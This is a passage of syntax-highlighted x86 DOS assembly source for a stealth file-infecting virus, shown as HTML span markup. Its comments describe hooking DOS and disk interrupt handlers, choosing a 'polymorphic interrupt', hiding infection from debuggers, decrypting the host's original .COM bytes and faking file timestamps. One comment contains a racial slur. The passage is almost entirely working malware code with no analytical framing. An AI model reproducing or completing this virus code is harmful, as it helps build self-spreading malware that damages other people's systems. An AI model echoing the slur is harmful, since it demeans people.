 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">2Eh</span><span class="sc0">                    </span><span class="sc1">; CS: override</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">

</span><span class="sc5">Probable</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">repnz</span><span class="sc0">  </span><span class="sc6">scasb</span><span class="sc0">                  </span><span class="sc1">; Scan ES:[DI] for AL</span><span class="sc0">
 </span><span class="sc6">jcxz</span><span class="sc0">   </span><span class="sc5">Inzip</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">2Eh</span><span class="sc0">                    </span><span class="sc1">; CS: override</span><span class="sc0">
 </span><span class="sc6">cmpsw</span><span class="sc0">                         </span><span class="sc1">; Compare next word</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Forgone</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">000Dh</span><span class="sc0">               </span><span class="sc1">; Impossible!</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Probable</span><span class="sc0">

</span><span class="sc5">Inzip</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">               </span><span class="sc1">; Next nigga!</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Retro</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Addfile</span><span class="sc0">                </span><span class="sc1">; Run out?</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">4C4Ch</span><span class="sc0"> </span><span class="sc1">; 'LL' ? </span><span class="sc0">
 </span><span class="sc6">clc</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Forgone</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ???</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">                 
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">                 </span><span class="sc1">; ???</span><span class="sc0">

</span><span class="sc5">Forgone</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Coverlet</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Zero AX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">        </span><span class="sc1">; Overwrite virus portion in memory...</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">; So virus codes will never be seen every time</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">stosw</span><span class="sc0">                  </span><span class="sc1">; infected program is being debugged </span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


                  </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc6">In</span><span class="sc0"> </span><span class="sc5">silentio</span><span class="sc0"> </span><span class="sc5">et</span><span class="sc0"> </span><span class="sc5">spe</span><span class="sc0"> </span><span class="sc5">fortitudo</span><span class="sc0"> </span><span class="sc5">mea...</span><span class="sc0">


</span><span class="sc5">Sick</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Old_Date</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Where We saved the date stamp</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">38h</span><span class="sc0">
 </span><span class="sc6">jnb</span><span class="sc0">    </span><span class="sc5">Future_File</span><span class="sc0">
 </span><span class="sc6">adc</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0C7h</span><span class="sc0">                </span><span class="sc1">; Add a century</span><span class="sc0">

</span><span class="sc5">Future_File</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Old_Time</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SFT_Off</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">

</span><span class="sc5">File_Attribs</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Restore/change file time stamp</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Ditto... date stamp</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                 </span><span class="sc1">; Close file handle</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">Zing</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">DOS_Floppy</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Vectorize</span><span class="sc0">              </span><span class="sc1">; Restore (viral) floppy disk handler</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">IO_Cassette</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Vectorize</span><span class="sc0">              </span><span class="sc1">; Restore I/O cassette (OS hook) handler</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; BX = 0054h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Vectorize</span><span class="sc0">              </span><span class="sc1">; Restore DOS disk handler</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Interstice</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">               </span><span class="sc1">; Pick an interrupt number</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Ranger</span><span class="sc0">                 </span><span class="sc1">; Obtain random word in range into AX</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">rol</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">             </span><span class="sc1">; Check whether the vector is used or not</span><span class="sc0">
 </span><span class="sc6">jnbe</span><span class="sc0">   </span><span class="sc5">Unchanged</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">ja</span><span class="sc0">     </span><span class="sc5">Unchanged</span><span class="sc0">              </span><span class="sc1">; If used, bail out</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Interstice</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Trapper</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Vectorize</span><span class="sc0">              </span><span class="sc1">; He he he, this is polymorphic interrupt, 8-)</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">sal</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                 </span><span class="sc1">; Multiply by 4, to get vector address in IVT</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">                         </span><span class="sc1">; Clear old interrupt vector</span><span class="sc0">
 </span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc5">Unchanged</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Restore_IRQs</span><span class="sc0">           </span><span class="sc1">; Restore PIC state</span><span class="sc0">

</span><span class="sc5">Lollipop</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Eh</span><span class="sc0">                 </span><span class="sc1">; Set default drive?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Leaveall</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                 </span><span class="sc1">; Close file handle function?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Dissimilar</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">F_Hand</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">      </span><span class="sc1">; Ready, steady, go!</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Leaveall</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ DOS function AH=49h/4Ah dispatcher ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Freelance</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; Protect MIA's current block</span><span class="sc0">
 </span><span class="sc6">pusha</span><span class="sc0">                         </span><span class="sc1">; Push all registers except segment ones</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                  </span><span class="sc1">; Virus segment</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">; Segment of block to be freed</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; Compare 'em</span><span class="sc0">
 </span><span class="sc6">popa</span><span class="sc0">                          </span><span class="sc1">; Pop all registers except segment ones</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Unequal</span><span class="sc0">                </span><span class="sc1">; Jump if ZF=0</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0009h</span><span class="sc0">               </span><span class="sc1">; "Memory block address invalid"</span><span class="sc0">

</span><span class="sc5">Return_Error</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">stc</span><span class="sc0">                           </span><span class="sc1">; Set CF</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Rejected</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ DOS function AH=25h dispatcher ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Rehook</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Button</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Same huh??</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Leaveall</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Fake_ROM</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; This user really sucks!!!</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Leaveall</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Interstice</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Leaveall</span><span class="sc0">

</span><span class="sc5">Unequal</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Clueless</span><span class="sc0">               </span><span class="sc1">; Pass control to DOS</span><span class="sc0">

</span><span class="sc5">Dissimilar</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4B01h</span><span class="sc0">               </span><span class="sc1">; Load but not execute program?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Overlay</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">                 </span><span class="sc1">; Canonize file/path name?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Anything</span><span class="sc0">               </span><span class="sc1">; Branch if not</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Ah</span><span class="sc0">

</span><span class="sc5">Character</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Bad_Func</span><span class="sc0">

</span><span class="sc5">Anything</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6Ch</span><span class="sc0">                 </span><span class="sc1">; Extended open/create?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Unequal</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">F_Hand</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; Restore AX and clear viral handle</span><span class="sc0">

</span><span class="sc5">Leaveall</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Bad_Func</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ DOS function AH=3Eh dispatcher ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Freehand</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">dw</span><span class="sc0">     </span><span class="sc2">0FB81h</span><span class="sc0">                 </span><span class="sc1">; Is it the handle We were saved before?</span><span class="sc0">

</span><span class="sc5">F_Hand</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; Stored file handle</span><span class="sc0">

 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Unequal</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4400h</span><span class="sc0">               </span><span class="sc1">; IOCTL - get device/file handle infos</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">rol</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; Device or file?</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Unequal</span><span class="sc0">                </span><span class="sc1">; Branch if device</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Call DOS</span><span class="sc0">

</span><span class="sc5">Rejected</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Bad_Func</span><span class="sc0">               </span><span class="sc1">; Invalid handle?</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc0">     </span><span class="sc1">; Where We saved the file drive + path + name</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Orbit</span><span class="sc0">

</span><span class="sc5">Overlay</span><span class="sc4">:</span><span class="sc0">                       </span><span class="sc1">; 'tis usually generated by debugger programs,</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">                          </span><span class="sc1">; load a program but it ain't gonna be executed</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">                    </span><span class="sc1">; Load the program...</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">; Restore BX (destroyed by DOS)</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Bad_Func</span><span class="sc0">               </span><span class="sc1">; File not found?</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒ[ Steal virus portion without disinfects the file ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


 </span><span class="sc6">cld</span><span class="sc0">                           </span><span class="sc1">; Ah...! DF again!</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flip</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Load entry point vector from parameter block</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">               </span><span class="sc1">; Entry point = 0100h ? (.COM file?)</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Inclined</span><span class="sc0">               </span><span class="sc1">; Nope, check whether it's an .EXE</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc0">  </span><span class="sc1">; First instruction is a near JMP ?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Unclasp</span><span class="sc0">                </span><span class="sc1">; No, it's not infected</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                  </span><span class="sc1">; If CL + CH = zero, the file's infected</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Unclasp</span><span class="sc0">


                 </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc5">Experientia</span><span class="sc0"> </span><span class="sc5">est</span><span class="sc0"> </span><span class="sc5">optima</span><span class="sc0"> </span><span class="sc5">rerum</span><span class="sc0"> </span><span class="sc5">magistra</span><span class="sc0">


 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                  </span><span class="sc1">; DI = 0100h</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Decryptor</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirBeg</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffy</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirBeg</span><span class="sc4">)]</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Seamless</span><span class="sc0">               </span><span class="sc1">; Decrypt original 24 bytes of .COM file</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Unclasp</span><span class="sc0">                </span><span class="sc1">; ZF=0 ƒƒƒ file's not infected</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Why not LODSW ?</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
